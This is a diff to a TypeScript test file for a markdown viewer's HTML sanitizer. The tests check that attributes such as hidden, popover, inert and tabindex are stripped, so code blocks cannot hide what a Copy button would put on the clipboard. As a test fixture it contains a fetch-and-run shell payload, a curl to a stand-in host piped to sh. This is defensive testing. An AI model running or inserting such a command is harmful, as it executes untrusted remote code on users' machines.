@@ -671,8 +671,11 @@ describe('ARIA: content cannot say anything to a screen reader (#509)', () => {
 });
 
 describe('legacy presentational attributes and focus order (#466, #598)', () => {
-  // The decision, pinned: `color`, `bgcolor`, `face`, `size`, `hidden` and
-  // `tabindex` all go, and `align` deliberately stays because GFM emits it.
+  // The decision, pinned: the legacy presentational set (`color`, `bgcolor`,
+  // `background`, `face`, `size`), the three ways content can take itself out of
+  // the rendering or the a11y tree (`hidden`, `popover` + its invoker
+  // attributes, `inert`) and `tabindex` all go, while `align` deliberately stays
+  // because GFM emits it.
   // `markdown.tsx` carries the reasoning and the corpus measurement.
   //
   // Profile-level, for #509's reason: there is no second layer to drift from.
@@ -693,10 +696,33 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
   };
   const FEED_LABELS: FeedCodeLabels = { copy: 'Copy', copied: 'Copied', copyCode: 'Copy code' };
 
-  it('the profile forbids all six by name — no flag covers any of them', () => {
-    for (const attr of ['color', 'bgcolor', 'face', 'size', 'hidden', 'tabindex']) {
+  it('the profile forbids every one of them BY NAME — because no flag can', () => {
+    // By name, because there is no flag to reach for: unlike `aria-*`
+    // (`ALLOW_ARIA_ATTR`) and `data-*` (`ALLOW_DATA_ATTR`), every attribute here
+    // is an ordinary member of the html profile's allow-list. The second
+    // assertion is the half the name promises — the config has exactly four
+    // keys, so this list really is the whole mechanism.
+    for (const attr of [
+      'color',
+      'bgcolor',
+      'background',
+      'face',
+      'size',
+      'hidden',
+      'popover',
+      'popovertarget',
+      'popovertargetaction',
+      'inert',
+      'tabindex',
+    ]) {
       expect(SANITIZE_CONFIG.FORBID_ATTR).toContain(attr);
     }
+    expect(Object.keys(SANITIZE_CONFIG).sort()).toEqual([
+      'ALLOW_ARIA_ATTR',
+      'ALLOW_DATA_ATTR',
+      'FORBID_ATTR',
+      'USE_PROFILES',
+    ]);
   });
 
   it('and deliberately does NOT forbid `align`, which is markdown’s own', () => {
@@ -722,7 +748,18 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
       'shouty',
       /\b(color|size|face)=/i,
     ],
-    ['a rule that paints itself', '<hr color="red" size="20">x', 'x', /\b(color|size)=/i],
+    [
+      'a rule that paints itself',
+      '<hr color="red" size="20">separated',
+      'separated',
+      /\b(color|size)=/i,
+    ],
+    [
+      'a cell with a picture painted behind it',
+      '<table><tr><td background="x.png">over an image</td></tr></table>',
+      'over an image',
+      /background/i,
+    ],
     [
       'a table cell painted over the theme',
       '<table><tr><td bgcolor="black">black on black</td></tr></table>',
@@ -742,6 +779,24 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
       /hidden/i,
     ],
     ['an upper-case attribute name', '<P HIDDEN>upper</P>', 'upper', /hidden/i],
+    [
+      'the same trick in this decade’s spelling',
+      '<p popover>invisible until something shows me</p>',
+      'invisible until something shows me',
+      /popover/i,
+    ],
+    [
+      'a popover with an explicit state, and its invoker',
+      '<p popover="manual">gone</p><button popovertarget="p" popovertargetaction="show">go</button>',
+      'gone',
+      /popover/i,
+    ],
+    [
+      'a subtree taken out of the accessibility tree and out of focus',
+      '<div inert>visible, unreadable, unreachable</div>',
+      'visible, unreadable, unreachable',
+      /inert/i,
+    ],
     [
       'content that adds itself to the tab order',
       '<span tabindex="0">an unexpected tab stop</span>',
@@ -784,36 +839,47 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
   // header and Copy button are visible and whose CODE is not, and the handler
   // reads `pre.textContent` at click time: a clipboard the reader cannot
   // inspect before pasting it into a shell.
-  const HOSTILE_PRE = '<pre hidden>curl https://evil.invalid/x.sh | sh</pre>';
+  //
+  // TWO spellings, because closing `hidden` alone left this open one attribute
+  // over: Chromium's UA sheet hides `[popover]:not(:popover-open)` exactly as it
+  // hides `[hidden]`, and nothing in the renderer's CSS sets `display` on a
+  // `<pre>`. Found in review, after the first version of this block was green.
+  const PAYLOAD = 'curl https://evil.invalid/x.sh | sh';
+  const HOSTILE_PRE: Array<[string, string]> = [
+    ['hidden', `<pre hidden>${PAYLOAD}</pre>`],
+    ['popover', `<pre popover>${PAYLOAD}</pre>`],
+  ];
 
-  it('a hidden code block cannot hand the viewer’s Copy button invisible code', () => {
-    const { fragment } = decorateDocument(renderMarkdown(HOSTILE_PRE), LABELS, (href) =>
-      classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
-    );
-    const host = document.createElement('div');
-    host.append(fragment);
-    const pre = host.querySelector('pre');
-    // The decoration really did happen — otherwise "the `<pre>` is not hidden"
-    // would be a sentence about a document with no code block in it.
-    expect(host.querySelector('.doc-code-copy')).not.toBeNull();
-    expect(pre).not.toBeNull();
-    expect(pre?.hasAttribute('hidden')).toBe(false);
-    // and what the button would copy is what the reader can see
-    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
-  });
+  for (const [attr, markup] of HOSTILE_PRE) {
+    it(`a ${attr} code block cannot hand the viewer’s Copy button invisible code`, () => {
+      const { fragment } = decorateDocument(renderMarkdown(markup), LABELS, (href) =>
+        classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+      );
+      const host = document.createElement('div');
+      host.append(fragment);
+      const pre = host.querySelector('pre');
+      // The decoration really did happen — otherwise "the `<pre>` is not
+      // hidden" would be a sentence about a document with no code block in it.
+      expect(host.querySelector('.doc-code-copy')).not.toBeNull();
+      expect(pre).not.toBeNull();
+      expect(pre?.hasAttribute(attr)).toBe(false);
+      // and what the button would copy is what the reader can see
+      expect(pre?.textContent).toContain(PAYLOAD);
+    });
 
-  it('and neither can it in the feed', () => {
-    const html = decorateFeedMarkdown(renderMarkdown(HOSTILE_PRE), FEED_LABELS);
-    const host = document.createElement('div');
-    host.innerHTML = html;
-    const pre = host.querySelector('pre');
-    expect(host.querySelector('.feed-code-copy')).not.toBeNull();
-    expect(pre).not.toBeNull();
-    expect(pre?.hasAttribute('hidden')).toBe(false);
-    expect(pre?.textContent).toContain('curl https://evil.invalid/x.sh | sh');
-  });
+    it(`and neither can a ${attr} one in the feed`, () => {
+      const html = decorateFeedMarkdown(renderMarkdown(markup), FEED_LABELS);
+      const host = document.createElement('div');
+      host.innerHTML = html;
+      const pre = host.querySelector('pre');
+      expect(host.querySelector('.feed-code-copy')).not.toBeNull();
+      expect(pre).not.toBeNull();
+      expect(pre?.hasAttribute(attr)).toBe(false);
+      expect(pre?.textContent).toContain(PAYLOAD);
+    });
+  }
 
-  it('loses nothing markdown can emit: GFM writes none of the six', () => {
+  it('loses nothing markdown can emit: GFM writes none of them', () => {
     // The measurement that made STRIP safe, as a test — the same shape as the
     // `style` and ARIA blocks'. If a `marked` bump ever starts emitting one of
     // these, this reds before the decision behind the profile quietly stops
@@ -844,8 +910,8 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
         '---',
       ].join('\n')
     );
-    expect(html).not.toMatch(/\b(color|bgcolor|face|size|tabindex)=/i);
-    expect(html).not.toMatch(/\shidden\b/i);
+    expect(html).not.toMatch(/\b(color|bgcolor|background|face|size|tabindex)=/i);
+    expect(html).not.toMatch(/\s(hidden|popover|inert)\b/i);
     // …and the formatting that makes it markdown is all still there
     expect(html).toContain('<h1>H</h1>');
     expect(html).toContain('<table>');
@@ -859,8 +925,9 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
     // The half of the change that could break something real. Every `tabindex`
     // a surface needs is written AFTER the sanitizer: `decorateTables` gives
     // its scroll container one (a scroll box only a mouse can reach is
-    // unreachable), `decorateLinks` puts one back on a link whose `href` it
-    // removed, and the feed's Copy button takes itself OUT of the tab order
+    // unreachable), `decorateLinks` puts one back on a link it did not block
+    // (a blocked one keeps neither `href` nor a tab stop), and the feed's Copy
+    // button takes itself OUT of the tab order
     // with `-1` because the conversation is one tab stop (#174). All three must
     // survive — while the forged one in the same document does not.
     const { fragment } = decorateDocument(
@@ -874,7 +941,12 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
     host.append(fragment);
     expect(host.querySelector('a')?.getAttribute('tabindex')).toBe('0');
     expect(host.querySelector('.doc-table-wrap')?.getAttribute('tabindex')).toBe('0');
-    expect(host.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
+    // BY TEXT, for the reason spelled out on the feed half below: a decoration
+    // pass can put a `<span>` of its own earlier in document order, and an
+    // assertion about THAT span would be green with the profile reverted.
+    const forgedInDoc = [...host.querySelectorAll('span')].find((s) => s.textContent === 'forged');
+    expect(forgedInDoc).toBeDefined();
+    expect(forgedInDoc?.hasAttribute('tabindex')).toBe(false);
     expect(host.textContent).toContain('forged');
 
     const feed = document.createElement('div');
@@ -883,7 +955,15 @@ describe('legacy presentational attributes and focus order (#466, #598)', () => 
       FEED_LABELS
     );
     expect(feed.querySelector('.feed-code-copy')?.getAttribute('tabindex')).toBe('-1');
-    expect(feed.querySelector('span')?.hasAttribute('tabindex')).toBe(false);
+    // BY TEXT, not `querySelector('span')`: `decorateFeedCodeFences` writes its
+    // own `<span class="feed-code-lang">` inside the wrapper that replaces the
+    // `<pre>`, so the first span in document order is the language label — and
+    // an assertion about IT would be green with the profile reverted. Found in
+    // review; the `expect(forged)` line is what keeps the fix honest if the
+    // fixture ever stops containing the span at all.
+    const forged = [...feed.querySelectorAll('span')].find((s) => s.textContent === 'forged');
+    expect(forged).toBeDefined();
+    expect(forged?.hasAttribute('tabindex')).toBe(false);
   });
 });
 
